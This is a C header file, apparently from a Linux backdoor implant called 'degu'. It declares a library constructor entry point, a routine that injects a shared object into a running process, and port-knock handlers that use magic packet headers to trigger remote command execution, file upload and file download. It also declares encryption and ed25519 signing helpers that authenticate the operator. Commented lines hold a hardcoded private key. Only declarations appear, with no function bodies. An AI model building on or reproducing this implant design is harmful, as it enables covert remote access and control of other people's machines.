#include "keys.h"

#ifdef PROD
    #define TRACE   (void)sizeof
    #define DEGU_FUNC_EXPORT __attribute__ ((visibility ("default")))
    #define DEGU_FUNC_INIT   __attribute__((constructor))
#else
    #define TRACE( fmt , args... ) trace("\033[1;36m%-18s\033[0;33m%-18s\033[0;32m#%d  \t\033[0m" fmt , __FILE__ , __FUNCTION__ , __LINE__ , ##args );
    #define DEGU_FUNC_EXPORT __attribute__ ((visibility ("default")))
    #define DEGU_FUNC_INIT  __attribute__((constructor,visibility ("default")))
#endif

#define PKTLEN_TRIGG 0x00000400
#define STRIPUDP 42
#define LIB_BYPASS "_LC" // flag to unload raw sock and alarm when used by python
#define WAKE 2 // timer sigalarm
#define TIMEOUT 10 // timeout for network operations

#define DEGU_EXE "<o)~" // magic tiny degu header for execution
#define DEGU_UP "Oo>>" // magic tiny degu header for upload
#define DEGU_DL "Oo<<" // magic tiny degu header for download
#define DEGU_GHOST_MAX_CMD 1000 // max bytes for cmd

int inject(int pid,char *dso);
void trace(const char* format, ...);
int verify_buffer(unsigned char *data,size_t len);
void xcrypt_data(uint8_t *key, unsigned char* data, ssize_t len);
int knock(unsigned char* data,size_t len);
void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret);
void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret);
void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret);
void ed25519_key_exchange(unsigned char *shared_secret, const unsigned char *public_key, const unsigned char *private_key);
void xsig(unsigned char* signature, const unsigned char* message, size_t message_len, const unsigned char* private_key);
unsigned int xvrfy(const unsigned char* signature, const unsigned char* message, size_t message_len);

void setup_keys(void);
void knock_ghost_exe( unsigned char * cmd, size_t len );

DEGU_FUNC_EXPORT int xbuf(unsigned char *destkey,unsigned char *privkey, unsigned char *data, size_t len);
DEGU_FUNC_EXPORT void xcrypt_knock(unsigned char* data, ssize_t len);
DEGU_FUNC_EXPORT void keygen(char* path);

DEGU_FUNC_INIT void degu(); // lib entry point



//#define IV { 0x44, 0x65, 0x75, 0x73, 0x20, 0x65, 0x78, 0x20, 0x6d, 0x61, 0x63, 0x68, 0x69, 0x6e, 0x61, 0x2e }
// knock key must be equals to 32 bytes


//public_key = 550311fe9972a50623c894d96cce7730894d48f0bcdf8e914dcf66c475d2761b
//unsigned char private_key[64] = { 64, 228, 26, 104, 107, 111, 180, 56, 224, 34, 57, 246, 147, 64, 153, 120, 184, 194, 114, 92, 170, 181, 8, 1, 5, 16, 12, 174, 229, 203, 126, 112, 41, 43, 116, 89, 154, 19, 113, 126, 53, 165, 186, 169, 203, 230, 56, 165, 145, 193, 114, 245, 160, 230, 57, 180, 202, 60, 56, 37, 88, 183, 144, 174 };
//private_key = 40e41a686b6fb438e02239f693409978b8c2725caab5080105100caee5cb7e70292b74599a13717e35a5baa9cbe638a591c172f5a0e639b4ca3c382558b790ae

extern unsigned char bot_public_key[32];
extern unsigned char bot_private_key[64];
extern unsigned char knock_key[32];
extern unsigned char public_key[32];
